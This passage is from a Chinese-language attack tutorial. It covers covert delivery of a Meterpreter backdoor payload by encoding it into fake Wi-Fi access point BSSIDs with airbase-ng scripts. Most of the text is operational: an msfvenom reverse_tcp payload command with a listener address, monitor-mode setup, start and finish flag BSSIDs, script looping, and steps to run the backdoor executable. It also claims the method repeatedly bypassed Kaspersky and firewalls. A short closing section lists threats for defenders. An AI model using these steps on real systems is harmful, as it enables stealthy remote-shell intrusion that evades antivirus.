    sleep 15 ;
    killall airbase-ng ;
注意：你可以在bash脚本“Script2.sh”文件中使用循环命令，例如使用（for）。
如图A所示，我们有script1.sh文件，用于将Meterpreter 有效载荷注入到BSSID。
图A
如图A所示，Meterpreter 有效载荷从第3行开始。在本文中我的Meterpreter 有效载荷是510字节。在这种情况下，使用airbase-ng命令可以为名为“Fake”的伪造AP注入5字节的有效载荷到BSSID。因此我们应该有102行用于通过airbase-ng命令将所有的有效载荷注入到BSSID。
102 * 5 = 510字节
注意：每个BSSID包含5个字节的有效载荷。
    BSSID = 00：fc：48：83：e4：f0
{5字节} ==> fc-48-83-e4-f0
在这种情况下，应将两个BSSID MAC地址添加到script1.sh文件。
如图A所示，我的脚本在第2行有MAC地址00：ff：ff：ff：ff：ff，这个Mac地址或BSSID是启动攻击和传输流量到被感染系统的标志，再如图B所示，此文件应该以BSSID
{00：ff：00：ff：00：ff}结束。
    BSSID Flag for Start  =  00:ff:ff:ff:ff:ff
    BSSID Flag for Finish = 00:ff:00:ff:00:ff
BSSID注入循环：改变BSSID（102 + 2）= 104次。
图B
如图C所示，可以看到第二个脚本script2.sh文件，在这个文件中可以使用循环命令，例如（For）。
图C
在 “script2.sh” 文件中，应该至少kill airbase-ng 104次。
**具体分析**
接下来我要通过我的工具（NativePayload_BSSID.exe）来逐步分析这个方法：
步骤如下：
**步骤0：** 创建Wlan0mon（监控模式）。
语法：airmon-ng start wlan0
**步骤1：** 使用以下命令生成一个后门有效载荷：
    msfvenom -a x86_64 --platform windows -p windows / x64 / meterpreter / reverse_tcp lhost = 192.168.1.50 -f c> payload.txt
**步骤2：** 在payload.txt文件中将有效载荷的格式从“ xfc x48 x83 xe4”替换为“fc4883e4”。
可以使用这个工具的 “帮助”显示所有的语法，如图1所示：
图片1
现在应该复制粘贴有效载荷字符串，通过NULL NativePayload_BSSID，如图1-1所示：
语法：c:> NativePayload.exe null “fc4883e4…”
图1-1
接下来将所有行复制到一个bash脚本，例如“script1.sh”文件。
注意：仅复制粘贴airbase-ng命令行到script1.sh文件。
在这种情况下，这些行应该是102行+2 = 104行。
如图A所示，你应该在脚本的第一行手动添加 “＃！/ bin / bash”，现在在这个文件中应该有105行。
**步骤3：** 在Linux端运行Script1.sh。
更改chmod并运行此脚本，如图2所示：
图2
步骤4：创建 script2.sh，并更改此脚本的chmod，但是不需要在此步骤中运行这个脚本，如图3所示。
图3
注意：应该手动创建bash脚本，如图C所示。
**步骤5：** 运行后门，使用NativePayload_BSSID.exe工具，如图4所示，我在kali linux创建了Meterpreter
Listener，IPAddress 192-168-1-50，执行了“script1.sh”。
步骤5包含以下步骤：
步骤AA：Meterpreter Listener执行（linux）
步骤BB：script1.sh运行（linux）
步骤CC：后门“NativePayload_BSSID.exe” 运行（Windows）
步骤DD：script2.sh运行（linux）
在步骤CC中，应该使用以下的语法来执行后门NativePayload_BSSID，如图4所示
NativePayload_BSSID.exe “essid”
在本文中，我们在script1.sh中的ESSID是“Fake”，所以正确的语法是：
    c：> NativePayload_BSSID.exe“Fake”
如图4所示，执行步骤（AA，BB和CC）。
图4
如图4所示，由用户“u1”执行后门，接下来应该运行“script2.sh”（步骤DD）。
后门代码试图在AIR上扫描ESSID“Fake”，然后转储BSSID为“Fake”AP，因此如图4所示，我的代码转储4次BSSID“00：ff：ff：ff：ff：ff”，该BSSID是启动攻击和通过BSSID传输有效载荷的标志。
所以在AIR上，我们有以下这些步骤：
接下来运行script2.sh（步骤DD）。
在运行Script2.sh后，每15秒该脚本将从Script1.sh文件中删除一个Airbase-ng命令。
运行Script2.sh后，在AIR上我们有以下这些步骤：
如图5所示，我的后门在运行“script2.sh”文件后尝试转储BSSID。
图5：通过BSSID和无线流量传输后门有效载荷
如图6所示，30分钟后你将得到meterpreter 会话。
图6
在图中可以看到我们已经通过C＃代码建立了Meterpreter会话，并且我的Kaspersky
2017杀毒软件被这个方法一次又一次地绕过。最终meterpreter会话成功建立了。
注意：在图7中你可以看到我的代码在15秒延迟后建立Meterpreter会话连接，所以如果你使用我的代码验证这个方法，转储所有的有效载荷后，你应该等待15秒，然后你将得到Meterpreter会话。
图7
**结语**
无线设备总是很容易被攻击，因此我们应该考虑以下威胁：
1\. 恶意软件或后门有效载荷注入到WiFi设备的BSSID，以及通过无线流量传输是可能的。
2\. 如果你想为你的客户端和网络基础设施使用WIFI设备，你应该考虑这些威胁。
3\. 受感染的系统是脆弱的，你的客户端也许会被攻击者攻击。
4\. 我的后门试图扫描ESSIDs，例如“Fake”，以转储BSSID，这个流量将会悄悄的工作。
5\. 你的杀毒软件无法检测到，而且 LAN /
WAN中的防火墙被绕过，因为我们没有任何流量通过这些基础设施。在这种情况下，在AIR上我们在被感染系统Wifi卡和攻击者系统Wifi卡之间有直接流量。在后门转储有效载荷后，我们不使用Wifi卡，而是通过LAN
/ WAN将Reverse_tcp
Meterpreter会话流量从被感染系统传输到攻击者系统。因此在这种情况下，我们在Internet或LAN中有从后门系统到攻击者系统的传出流量，而且这个流量大部分情况下不会被Windows防火墙阻拦。
C＃源代码：